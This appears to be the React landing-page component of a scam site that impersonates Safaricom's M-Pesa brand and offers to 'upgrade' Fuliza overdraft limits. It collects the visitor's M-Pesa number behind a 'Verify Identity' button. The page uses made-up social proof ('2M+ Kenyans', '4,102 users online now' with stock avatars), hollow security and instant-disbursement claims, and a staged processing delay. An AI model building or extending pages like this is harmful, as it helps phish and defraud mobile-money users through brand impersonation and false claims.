
import React, { useState } from 'react';

interface LandingProps {
  onCheck: (phone: string) => void;
}

const Landing: React.FC<LandingProps> = ({ onCheck }) => {
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.length < 10) return;
    setLoading(true);
    setTimeout(() => {
      onCheck(phone);
      setLoading(false);
    }, 1500);
  };

  return (
    <div className="flex-1 flex flex-col gap-10 animate-in fade-in slide-in-from-bottom-6 duration-700">
      <div className="space-y-4">
        <span className="bg-green-100 text-safaricom-green text-[10px] font-extrabold px-3 py-1 rounded-full uppercase tracking-[0.2em]">
          Automated System
        </span>
        <h2 className="text-4xl font-extrabold text-gray-900 leading-[1.1] tracking-tight">
          Unlock Your True <br/>
          <span className="safaricom-green">M-Pesa Potential.</span>
        </h2>
        <p className="text-gray-500 text-lg font-medium leading-relaxed max-w-sm">
          Join 2M+ Kenyans who have successfully upgraded their Fuliza limits using our automated portal.
        </p>
      </div>

      <div className="bg-white p-8 rounded-[32px] shadow-2xl shadow-green-900/5 border border-gray-100 relative group overflow-hidden">
        <div className="absolute top-0 right-0 w-32 h-32 bg-safaricom-green/5 rounded-full -mr-16 -mt-16 blur-3xl group-hover:bg-safaricom-green/10 transition-colors"></div>
        
        <form onSubmit={handleSubmit} className="space-y-6 relative z-10">
          <div className="space-y-3">
            <div className="flex items-center justify-between px-1">
              <label className="text-sm font-bold text-gray-700">M-Pesa Number</label>
              <span className="text-[10px] font-bold text-gray-400 bg-gray-50 px-2 py-0.5 rounded uppercase tracking-widest">Required</span>
            </div>
            <div className="relative">
              <input
                type="tel"
                placeholder="e.g. 0712 345 678"
                required
                autoFocus
                value={phone}
                onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 10))}
                className="w-full px-6 py-5 bg-gray-50 border-2 border-transparent rounded-2xl text-xl font-bold tracking-widest focus:outline-none focus:ring-4 focus:ring-green-100 focus:border-safaricom-green focus:bg-white transition-all placeholder:text-gray-300"
              />
              <div className="absolute right-5 top-1/2 -translate-y-1/2">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/15/M-PESA_LOGO-01.svg/512px-M-PESA_LOGO-01.svg.png" alt="M-Pesa" className="h-4" />
              </div>
            </div>
          </div>

          <button
            type="submit"
            disabled={phone.length < 10 || loading}
            className={`w-full py-5 rounded-2xl font-black text-lg text-white shadow-xl transition-all transform active:scale-[0.98] flex items-center justify-center gap-3 ${
              loading || phone.length < 10 ? 'bg-gray-200 cursor-not-allowed shadow-none' : 'bg-safaricom-green hover:bg-[#3e9a41] shadow-green-200'
            }`}
          >
            {loading ? (
              <>
                <svg className="animate-spin h-6 w-6 text-white" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Processing...
              </>
            ) : (
              <>
                Verify Identity
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M9 5l7 7-7 7" />
                </svg>
              </>
            )}
          </button>
        </form>

        <div className="mt-8 pt-6 border-t border-gray-50 flex items-center justify-center gap-6">
           <div className="flex -space-x-2">
              {[1,2,3,4].map(i => (
                <div key={i} className="w-8 h-8 rounded-full border-2 border-white bg-gray-100 overflow-hidden">
                  <img src={`https://i.pravatar.cc/100?u=${i + 10}`} alt="User" />
                </div>
              ))}
           </div>
           <p className="text-[10px] text-gray-400 font-bold uppercase tracking-tight">
             <span className="text-gray-900">4,102 users</span> online now
           </p>
        </div>
      </div>

      <div className="grid grid-cols-1 gap-4">
        <div className="bg-white p-5 rounded-2xl border border-gray-100 flex items-center gap-5 shadow-sm">
           <div className="w-12 h-12 bg-blue-50 rounded-2xl flex items-center justify-center shrink-0">
              <svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
           </div>
           <div>
              <h4 className="font-bold text-gray-900 text-sm">Bank-Level Security</h4>
              <p className="text-xs text-gray-500 font-medium">Your data is encrypted using 256-bit SSL technology.</p>
           </div>
        </div>
        <div className="bg-white p-5 rounded-2xl border border-gray-100 flex items-center gap-5 shadow-sm">
           <div className="w-12 h-12 bg-green-50 rounded-2xl flex items-center justify-center shrink-0">
              <svg className="w-6 h-6 text-safaricom-green" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
              </svg>
           </div>
           <div>
              <h4 className="font-bold text-gray-900 text-sm">Instant Disbursement</h4>
              <p className="text-xs text-gray-500 font-medium">New limits reflect within 2 minutes of verification.</p>
           </div>
        </div>
      </div>
    </div>
  );
};

export default Landing;
